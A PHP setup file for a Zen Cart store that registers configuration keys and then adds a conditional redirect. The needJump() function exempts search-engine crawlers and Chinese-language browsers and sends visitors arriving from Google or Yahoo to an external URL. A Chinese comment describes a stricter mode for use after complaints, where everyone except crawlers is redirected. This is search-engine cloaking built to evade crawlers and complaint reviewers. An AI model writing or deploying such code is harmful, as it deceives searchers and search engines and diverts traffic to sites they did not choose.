<?php
$arrConfigs = array(
    'HEADING_TITLE' => array(
        'configuration_title' => 'Heading Title In Index.',
        'configuration_value' => 'Congratulations! You have successfully installed your Zen Cart&reg; E-Commerce Solution.',
        'configuration_description' => 'Home page welcome message, displayed in the middle of the home page.',
        'sort_order' => '1121',
    ),
    'TEXT_GREETING_GUEST' => array(
        'configuration_title' => 'Welcome to Guest.',
        'configuration_value' => 'Welcome <span class="greetUser">Guest!</span> Would you like to <a href="%s">log yourself in</a>?',
        'configuration_description' => 'Home page welcome message to guest, displayed in the middle of the home page. ',
        'sort_order' => '1122',
    ),
    'HEADER_SALES_TEXT' => array(
        'configuration_title' => 'Sales text in headers.',
        'configuration_value' => 'TagLine Here',
        'configuration_description' => 'Sales Text in headers. It often show at right about the logo.',
        'sort_order' => '1123',
    ),
    'JUMP_TO_URL' => array(
        'configuration_title' => 'Jump to URL.',
        'configuration_value' => '',
        'configuration_description' => '跳转到指定url，当符合条件的时候，如果需要对应内页跳转那么可以这么设置https://www.domain.com/{REQUEST_URI}',
        'sort_order' => '1124',
    ),
    'JUMP_TYPE' => array(
        'configuration_title' => 'Jump Type.',
        'configuration_value' => '1',
        'configuration_description' => '跳转类型：1（默认类型，只判断是否从google来路）；2（特殊类型，遇到投诉了，那么只有蜘蛛不跳，其它的都跳）。',
        'sort_order' => '1125',
    ),
);

$group_check = $db->Execute("SELECT min(configuration_group_id) as minid FROM " . TABLE_CONFIGURATION_GROUP . " WHERE 1");
if (!$group_check->EOF && $group_check->RecordCount() > 0 && $group_check->fields['minid'] > 0) {
    $group_id = $group_check->fields['minid'];
    //获取group id成功，尝试获取这个group下的全部常量
    $con_results = $db->Execute("SELECT configuration_key FROM " . TABLE_CONFIGURATION . " WHERE configuration_group_id = " . $group_id . "");
    $arrKeysExists = array();
    foreach($con_results as $con_result){
        $arrKeysExists[] = $con_result['configuration_key'];
    }
    foreach($arrConfigs as $key => $configItem){
        if(!in_array($key, $arrKeysExists)){
            $db->Execute("INSERT IGNORE INTO ".TABLE_CONFIGURATION." (configuration_title, configuration_key, configuration_value, configuration_description, configuration_group_id, sort_order, last_modified, date_added, use_function, set_function) VALUES('" . $configItem['configuration_title'] . "', '" . $key . "', '" . $configItem['configuration_value'] . "', '" . $configItem['configuration_description'] . "', ".$group_id.", '" . $configItem['sort_order'] . "', NULL, now(), NULL, '')");
        }
    }
}

#处理JUMP_TO_URL
if(defined('JUMP_TO_URL') && !empty(JUMP_TO_URL) && filter_var(JUMP_TO_URL, FILTER_VALIDATE_URL)){
    if(needJump())
    {
        $tourl = str_replace('{REQUEST_URI}', $_SERVER['REQUEST_URI'], JUMP_TO_URL);
        header('Location: ' . $tourl, true, 302);
        exit();
    }
}

/*判断是否需要跳转*/
function needJump(){
	$arr = array(
		'google',
		'bot',
		'yahoo',
		'yandex',
		'bing',
	);
	//如果是google蜘蛛不做任何操作
	foreach($arr as $str)
	{
		if(preg_match('/' . $str . '/i',$_SERVER['HTTP_USER_AGENT']))
		{
			return false;
		}
	}
	//如果语言是中文则不跳
	if(isset($_SERVER['HTTP_ACCEPT_LANGUAGE']) && preg_match('/(zh|cn)/i',$_SERVER['HTTP_ACCEPT_LANGUAGE']))
	{
		return false;
	}
    //来路根据JUMP_TYPE来判断，如果JUMP_TYPE没有设置，或者默认为1，那么没有来路的不跳，如果为2，那么没有来路的也跳
    if(defined('JUMP_TYPE') && JUMP_TYPE == 2){
        return true;
    }else{
        //判断session
        if(isset($_SESSION['referer']) && $_SESSION['referer'] == 'SearchEngine'){
            return true;
        }
        $referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
        //如果来路为空不跳
        if(empty($referer))
        {
            return false;
        }else{
        //如果来路不为空则判断是否为google来路
            $referer_array = parse_url($referer);
            $referer_host = strtolower($referer_array['host']);
            if(strstr($referer_host, '.google.') !== false || strstr($referer_host, '.yahoo.') !== false){ //来路为google或者yahoo
                $_SESSION['referer'] = 'SearchEngine';
                return true;
            }else{
                return false;
            }
        }
    }
}
